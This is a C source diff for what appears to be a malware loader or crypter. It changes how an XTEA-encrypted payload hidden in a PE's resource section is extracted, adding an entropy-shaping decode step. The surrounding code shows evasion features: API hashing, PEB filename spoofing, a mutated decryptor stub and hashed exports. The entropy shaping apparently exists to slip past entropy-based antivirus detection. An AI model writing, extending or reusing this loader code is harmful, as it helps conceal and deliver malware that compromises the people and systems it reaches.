@@ -2,6 +2,7 @@
 #include "Common.h"
 #include "ApiHashing.h"
 #include "..\Engine\PeBuilder.h"
+#include "..\Engine\EntropyCodec.h"
 
 typedef HRSRC   (WINAPI *pfnFindResourceW)(HMODULE, LPCWSTR, LPCWSTR);
 typedef HGLOBAL (WINAPI *pfnLoadResource)(HMODULE, HRSRC);
@@ -24,8 +25,12 @@ volatile BYTE g_PayloadResIdMarker[6] = {
 
 /* GetPayloadFromResource
  *
- * Parses the 280-byte PAYLOAD_METADATA block appended after the XTEA-encrypted
- * blob in the .rsrc section (RT_RCDATA, per-build integer ID from g_PayloadResIdMarker).
+ * Parses the 280-byte PAYLOAD_METADATA block appended after the entropy-shaped
+ * (EntropyCodec) XTEA blob in the .rsrc section (RT_RCDATA, per-build integer
+ * ID from g_PayloadResIdMarker).
+ *
+ * blobSize in metadata is the DECODED XTEA blob size; the resource physically
+ * holds blobSize*2 encoded bytes immediately before the metadata block.
  *
  * Metadata block layout (offsets from magic position p, growing toward lower addresses):
  *
@@ -38,7 +43,7 @@ volatile BYTE g_PayloadResIdMarker[6] = {
  *   p[-112..-49] spoof_exe      = PEB spoof filename (64 bytes)
  *   p[-240..-113] exportArg     = export argument string (128 bytes)
  *   p[-244..-241] exportHash    = per-build-seed Djb2 hash of DLL export; 0 = none
- *   p[-248..-245] blobSize      = XTEA blob size
+ *   p[-248..-245] blobSize      = DECODED XTEA blob size (encoded footprint = 2x)
  *   p[-252..-249] stubSize      = mutated ASM decryptor size
  *   p[-256..-253] origSize      = original decompressed PE size
  *   p[-260..-257] dll+pad       = [dll_idx0, dll_idx1, dll_idx2, 0x00]
@@ -142,22 +147,23 @@ BOOL GetPayloadFromResource(PBYTE*  ppRawPayload,
     DWORD  stubSize      = pMeta->stubSize;
     DWORD  origSize      = pMeta->origSize;
 
-    /* Sanity checks */
+    /* Sanity checks — encSize is the physical footprint of the blob in .rsrc */
+    DWORD encSize = blobSize * 2;
     DWORD metaOffset = (DWORD)(pMagicFound - fileBuffer) + 4;
-    if (blobSize == 0 || blobSize >= metaOffset)  { if (pdwError) *pdwError = 104; return FALSE; }
+    if (blobSize == 0 || encSize >= metaOffset)   { if (pdwError) *pdwError = 104; return FALSE; }
     if (stubSize == 0 || stubSize >= blobSize)    { if (pdwError) *pdwError = 105; return FALSE; }
 
-    /* blob starts immediately before the metadata block */
-    DWORD blobStartOffset = metaOffset - (DWORD)sizeof(PAYLOAD_METADATA) - blobSize;
+    /* encoded blob starts immediately before the metadata block */
+    DWORD blobStartOffset = metaOffset - (DWORD)sizeof(PAYLOAD_METADATA) - encSize;
     BYTE* rawBlob = fileBuffer + blobStartOffset;
 
-    /* Step 4: Copy blob to a private RW allocation for in-place XTEA decryption */
+    /* Step 4: Decode blob into a private RW allocation for in-place XTEA decryption */
     PBYTE pRetPayload = (PBYTE)pVirtualAlloc(NULL, blobSize,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_READWRITE);
     if (!pRetPayload) { if (pdwError) *pdwError = 106; return FALSE; }
 
-    custom_memcpy(pRetPayload, rawBlob, blobSize);
+    EntropyDecode(pRetPayload, rawBlob, blobSize);
 
     /* Step 5: Return all metadata to caller */
     *ppRawPayload                = pRetPayload;
